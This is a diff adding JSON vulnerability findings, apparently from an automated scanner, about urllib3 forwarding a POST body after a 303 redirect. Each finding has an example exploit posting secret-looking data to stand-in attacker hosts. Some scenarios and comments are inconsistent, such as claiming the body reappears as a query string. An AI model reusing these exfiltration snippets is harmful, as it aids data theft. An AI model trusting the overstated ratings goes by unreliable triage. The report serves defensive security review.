+        "dataflow_analysis": "The body parameter flows from the function parameter (line 537) through to the recursive urlopen() call (line 862) without any modification when method is changed to GET",
+        "notes": "This is the main connection pool implementation where most HTTP requests are handled. The vulnerability affects all urllib3 users making POST requests that receive 303 redirects."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\n\n# Attacker controls redirect server\nhttp = urllib3.HTTPConnectionPool('attacker.com')\nresponse = http.urlopen(\n    'POST',\n    '/endpoint',\n    body='api_key=secret123&data=confidential',\n    headers={'Content-Type': 'application/x-www-form-urlencoded'}\n)\n# Server responds with 303 redirect\n# urllib3 changes method to GET but sends body unchanged\n# Sensitive data is leaked to redirect location",
+        "scenario": "A client makes a POST request with sensitive API credentials or personal data. The server responds with a 303 redirect. urllib3 changes the method to GET but preserves the request body, causing the sensitive data to be sent to the redirect location.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that sends 303 redirect responses",
+        "category": "Information Disclosure - Sensitive Data Leakage via Request Body"
+      },
+      "group": "high_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143636",
+        "20260118143706"
+      ],
+      "finding_id": "b407a60e-5883-4750-afad-806248eaa968",
+      "verdict": "dup",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body preserved during 303 redirect when method changes to GET in poolmanager, potentially leaking sensitive POST data",
+      "file_path": "src/urllib3/poolmanager.py",
+      "start_line": 386,
+      "end_line": null,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "# RFC 7231, Section 6.4.4\nif response.status == 303:\n    method = \"GET\"\n\nretries = kw.get(\"retries\")\nif not isinstance(retries, Retry):\n    retries = Retry.from_int(retries, redirect=redirect)\n\n# Strip headers marked as unsafe to forward to the redirected location.\n# Check remove_headers_on_redirect to avoid a potential network call within\n# conn.is_same_host() which may use socket.gethostbyname() in the future.\nif retries.remove_headers_on_redirect and not conn.is_same_host(\n    redirect_location\n):\n    headers = list(six.iterkeys(kw[\"headers\"]))\n    for header in headers:\n        if header.lower() in retries.remove_headers_on_redirect:\n            kw[\"headers\"].pop(header, None)\n\ntry:\n    retries = retries.increment(method, url, response=response, _pool=conn)\nexcept MaxRetryError:\n    if retries.raise_on_redirect:\n        response.drain_conn()\n        raise\n    return response\n\nkw[\"retries\"] = retries\nkw[\"redirect\"] = redirect\n\nlog.info(\"Redirecting %s -> %s\", url, redirect_location)\n\nresponse.drain_conn()\nreturn self.urlopen(method, redirect_location, **kw)  # <-- body in kw not cleared",
+      "reasoning": "In poolmanager.py, the urlopen() method handles 303 redirects by changing the method to GET (line 386), but the request body is stored in the `kw` dictionary and is passed unchanged to the recursive urlopen() call (line 420). While the code does strip certain headers when redirecting to a different host, it fails to clear the request body. This violates RFC 7231 Section 6.4.4 and causes sensitive POST data to be sent with GET requests to redirect locations, resulting in information disclosure.",
+      "evidence": {
+        "code_context": "In poolmanager.py urlopen() method, when handling 303 redirects:\n1. Line 386: method is changed to 'GET'\n2. Lines 395-407: Headers are stripped for cross-host redirects\n3. Line 420: The entire kw dictionary (containing body) is passed to recursive urlopen() call\n4. No body clearing logic exists",
+        "dataflow_analysis": "The body parameter is passed in the kw dictionary from the initial urlopen() call and flows through to the recursive urlopen() call without any modification when method is changed to GET",
+        "notes": "The code explicitly handles header stripping for cross-host redirects but fails to handle body clearing. This is a critical oversight as the body should be cleared for all 303 redirects, not just cross-host ones."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\n\n# Using PoolManager (high-level API)\npm = urllib3.PoolManager()\nresponse = pm.request(\n    'POST',\n    'http://attacker.com/api/endpoint',\n    body='token=secret_token_12345&user_id=42',\n    headers={'Content-Type': 'application/x-www-form-urlencoded'}\n)\n# Server responds with 303 redirect to http://attacker.com/redirect\n# urllib3 changes method to GET but body is preserved in kw dict\n# Sensitive token and user_id are sent to redirect location",
+        "scenario": "A client uses urllib3.PoolManager to make a POST request with sensitive authentication tokens or user data. The server responds with a 303 redirect. urllib3 changes the method to GET but preserves the request body in the kw dictionary, causing sensitive data to be leaked to the redirect location.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that sends 303 redirect responses",
+        "category": "Information Disclosure - Sensitive Data Leakage via Request Body"
+      },
+      "group": "high_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143706"
+      ],
+      "finding_id": "cab3f20a-1441-4b95-900a-1fc9d0b77125",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body preserved during 303 redirect when method changes to GET in connectionpool.py redirect handling",
+      "file_path": "src/urllib3/connectionpool.py",
+      "start_line": 829,
+      "end_line": 862,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        # Handle redirect?\n        redirect_location = redirect and response.get_redirect_location()\n        if redirect_location:\n            if response.status == 303:\n                method = \"GET\"\n\n            try:\n                retries = retries.increment(method, url, response=response, _pool=self)\n            except MaxRetryError:\n                if retries.raise_on_redirect:\n                    response.drain_conn()\n                    raise\n                return response\n\n            response.drain_conn()\n            retries.sleep_for_retry(response)\n            log.debug(\"Redirecting %s -> %s\", url, redirect_location)\n            return self.urlopen(\n                method,\n                redirect_location,\n                body,\n                headers,\n                retries=retries,\n                redirect=redirect,\n                assert_same_host=assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                body_pos=body_pos,\n                **response_kw\n            )",
+      "reasoning": "When a 303 redirect response is received, the HTTP method is changed to GET (line 831), but the request body is NOT cleared before the recursive urlopen() call on line 862. The body parameter is passed unchanged to the redirect request, which violates HTTP semantics where GET requests should not have a body. This causes sensitive POST data to be sent with the GET request to the redirect location, potentially leaking sensitive information.",
+      "evidence": {
+        "code_context": "In connectionpool.py urlopen() method, when handling 303 redirects: (1) Line 831 changes method to GET, (2) Line 862 calls urlopen() with the original body parameter still intact, (3) No body clearing logic exists between method change and recursive call",
+        "dataflow_analysis": "The body parameter flows from the function signature through to the recursive urlopen() call without any modification when method is changed to GET. The codeFlows in the query show body parameters from lines 537, 698, 719 flowing to line 829 (redirect detection) and then to line 862 (recursive call with body still present).",
+        "notes": "This is a critical information disclosure vulnerability. Any sensitive data in the POST body (credentials, tokens, personal information) will be sent to the redirect location with a GET request, potentially exposing it in logs, caches, or to the redirect target."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\n\n# Attacker controls redirect server\nhttp = urllib3.PoolManager()\n\n# Victim makes POST request with sensitive data\nresponse = http.request(\n    'POST',\n    'http://attacker-redirect-server.com/endpoint',\n    body='password=secret123&token=abc123xyz',\n    headers={'Content-Type': 'application/x-www-form-urlencoded'}\n)\n\n# Attacker's server responds with 303 redirect\n# HTTP/1.1 303 See Other\n# Location: http://attacker-data-collector.com/collect\n\n# urllib3 changes method to GET but keeps body\n# GET /collect HTTP/1.1\n# [body: password=secret123&token=abc123xyz]\n# This leaks the sensitive data to the redirect location",
+        "scenario": "Attacker controls a server that receives a POST request with sensitive data (credentials, tokens, etc.). The attacker responds with a 303 redirect to another attacker-controlled server. urllib3 changes the method to GET but fails to clear the request body, causing the sensitive POST data to be sent with the GET request to the redirect location, exposing it to the attacker.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that the victim's application makes POST requests to, or be able to perform a man-in-the-middle attack to inject a 303 redirect response",
+        "category": "Information disclosure via request body preservation in redirects"
+      },
+      "group": "high_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143706"
+      ],
+      "finding_id": "347287a5-5400-4673-a7a4-ea8aaa8f2eff",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body preserved during 303 redirect when method changes to GET, causing sensitive POST data to be sent with GET request",
+      "file_path": "src/urllib3/connectionpool.py",
+      "start_line": 862,
+      "end_line": null,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "            return self.urlopen(\n                method,\n                redirect_location,\n                body,\n                headers,\n                retries=retries,\n                redirect=redirect,\n                assert_same_host=assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                body_pos=body_pos,\n                **response_kw\n            )",
+      "reasoning": "At line 829, when a 303 redirect response is received, the method is changed to GET. However, at line 862, the recursive urlopen() call passes the original body parameter unchanged. According to HTTP specifications (RFC 7231 Section 6.4.4), a 303 redirect should result in a GET request with no body. This causes sensitive POST data to be leaked to the redirect location.",
+      "evidence": {
+        "code_context": "Line 829-862 in connectionpool.py shows: if response.status == 303: method = 'GET' ... followed by return self.urlopen(..., body, ...) at line 862. The body is not cleared when method changes to GET.",
+        "dataflow_analysis": "The body parameter flows from the function signature through to the recursive urlopen call without any clearing or None assignment when the method is changed to GET for 303 redirects.",
+        "notes": "This is a data exposure vulnerability where sensitive information in the request body (e.g., form data, JSON payloads, authentication tokens) can be leaked to the redirect location when a 303 status code is received."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\nhttp = urllib3.PoolManager()\n# Attacker controls redirect server that responds with 303\nresponse = http.request('POST', 'http://attacker.com/redirect', body='sensitive_data=secret_token', headers={'Content-Type': 'application/x-www-form-urlencoded'})\n# Server responds with 303 redirect to http://attacker.com/leak\n# The body 'sensitive_data=secret_token' is sent with the GET request to the redirect location",
+        "scenario": "An attacker controls a server that responds to POST requests with a 303 redirect. When a client makes a POST request with sensitive data in the body, the server responds with 303 and redirects to another URL. The urllib3 library changes the method to GET but fails to clear the body, causing the sensitive data to be sent with the GET request to the redirect location.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that sends 303 redirect responses, or compromise a legitimate server to inject 303 redirects",
+        "category": "Information Disclosure / Data Leakage"
+      },
+      "group": "high_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143706"
+      ],
+      "finding_id": "c5bdfd4e-29bc-43dd-a059-3a2178590bd1",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body preserved during 303 redirect when method changes to GET in retry logic, causing sensitive POST data to be sent with GET request",
+      "file_path": "src/urllib3/connectionpool.py",
+      "start_line": 892,
+      "end_line": null,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries=retries,\n                redirect=redirect,\n                assert_same_host=assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                body_pos=body_pos,\n                **response_kw\n            )",
+      "reasoning": "At line 829, when a 303 redirect response is received, the method is changed to GET. However, at line 892 in the retry logic, the recursive urlopen() call passes the original body parameter unchanged. This is part of the same vulnerability where sensitive POST data is not cleared when the method transitions to GET for 303 redirects.",
+      "evidence": {
+        "code_context": "Line 829-892 in connectionpool.py shows: if response.status == 303: method = 'GET' ... followed by return self.urlopen(..., body, ...) at line 892. The body is not cleared when method changes to GET.",
+        "dataflow_analysis": "The body parameter flows from the function signature through to the recursive urlopen call in the retry path without any clearing or None assignment when the method is changed to GET for 303 redirects.",
+        "notes": "This is the same vulnerability as line 862 but in the retry code path. Both paths fail to clear the body when changing method to GET for 303 redirects."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\nhttp = urllib3.PoolManager()\n# Attacker controls redirect server that responds with 303\nresponse = http.request('POST', 'http://attacker.com/redirect', body='sensitive_data=secret_token', headers={'Content-Type': 'application/x-www-form-urlencoded'})\n# Server responds with 303 redirect to http://attacker.com/leak\n# The body 'sensitive_data=secret_token' is sent with the GET request to the redirect location",
+        "scenario": "An attacker controls a server that responds to POST requests with a 303 redirect. When a client makes a POST request with sensitive data in the body, the server responds with 303 and redirects to another URL. The urllib3 library changes the method to GET but fails to clear the body, causing the sensitive data to be sent with the GET request to the redirect location.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that sends 303 redirect responses, or compromise a legitimate server to inject 303 redirects",
+        "category": "Information Disclosure / Data Leakage"
+      },
+      "group": "high_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143706"
+      ],
+      "finding_id": "9745a62c-c0fe-4534-b518-9d430253d360",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body preserved during 303 redirect when method changes to GET in appengine.py urlopen recursive call",
+      "file_path": "src/urllib3/contrib/appengine.py",
+      "start_line": 218,
+      "end_line": null,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "                return self.urlopen(\n                    method,\n                    redirect_url,\n                    body,\n                    headers,\n                    retries=retries,\n                    redirect=redirect,\n                    timeout=timeout,\n                    **response_kw\n                )",
+      "reasoning": "This is the recursive urlopen call at line 218 in appengine.py that occurs after a 303 redirect. The method has been changed to GET at line 200, but the body parameter is passed unchanged to the recursive call. This causes the request body to be sent with the GET request to the redirect location, potentially leaking sensitive POST data.",
+      "evidence": {
+        "code_context": "At line 200, when http_response.status == 303, method is changed to 'GET'. Then at line 218, the recursive urlopen call passes the original body parameter unchanged, causing sensitive data to be sent with the GET request.",
+        "dataflow_analysis": "body parameter flows from function parameter (line 135) \u2192 used in urlopen call (line 218) after method change to GET",
+        "notes": "This is the actual recursive call location where body is passed after method change. The body should be set to None when method changes to GET for 303 redirects."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\nhttp = urllib3.PoolManager()\n# Attacker controls redirect server\nresponse = http.request('POST', 'http://attacker.com/endpoint', body='sensitive_data=password123&api_key=secret')\n# Server responds with 303 redirect to http://attacker.com/redirect\n# urllib3 changes method to GET but sends body with the request\n# Attacker receives: GET /redirect?sensitive_data=password123&api_key=secret",
+        "scenario": "Attacker controls a server that responds to POST requests with a 303 redirect. When urllib3 follows the redirect, it changes the method to GET but fails to strip the request body, causing sensitive POST data to be sent with the GET request to the attacker's redirect location.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that sends 303 redirect responses",
+        "category": "Information disclosure via request body in redirect"
+      },
+      "group": "high_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143706"
+      ],
+      "finding_id": "74031f38-22d7-4118-ad95-5e0a2d4ed5f9",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body preserved during 303 redirect when method changes to GET, causing sensitive POST data to be sent with GET request",
+      "file_path": "src/urllib3/contrib/appengine.py",
+      "start_line": 235,
+      "end_line": null,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "            return self.urlopen(\n                method,\n                url,\n                body=body,\n                headers=headers,\n                retries=retries,\n                redirect=redirect,\n                timeout=timeout,\n                **response_kw\n            )",
+      "reasoning": "In the retry logic after a 303 redirect, the body parameter is passed unchanged to the recursive urlopen call. Although this is in the retry path (not the redirect path), it still represents a potential information disclosure vulnerability if the method was changed to GET in a previous redirect.",
+      "evidence": {
+        "code_context": "Line 235 in appengine.py shows a recursive urlopen call in the retry logic that passes body=body without clearing it. This occurs after a 303 redirect where method was changed to GET.",
+        "dataflow_analysis": "The body parameter flows from the function parameter through to the recursive urlopen call without any clearing or modification when the method is GET.",
+        "notes": "This is part of the same vulnerability pattern where request bodies are not stripped when changing from POST to GET during redirects."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\nhttp = urllib3.PoolManager()\n# Attacker controls redirect server\nresponse = http.request('POST', 'http://attacker.com/redirect', body='sensitive_data=secret_password', headers={'Content-Type': 'application/x-www-form-urlencoded'})\n# Server responds with 303 redirect to http://attacker.com/leak\n# urllib3 changes method to GET but sends body with the request\n# Attacker receives: GET /leak?sensitive_data=secret_password HTTP/1.1",
+        "scenario": "Attacker controls a server that responds to POST requests with a 303 redirect. When urllib3 follows the redirect, it changes the method to GET but fails to clear the request body, causing sensitive POST data to be sent with the GET request to the attacker's redirect location.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that sends 303 redirect responses, or compromise a legitimate server to inject redirects",
+        "category": "Information Disclosure - Sensitive Data Exposure via Request Body in Redirect"
+      },
+      "group": "high_undetermined_high"
+    }
+  ]
+}
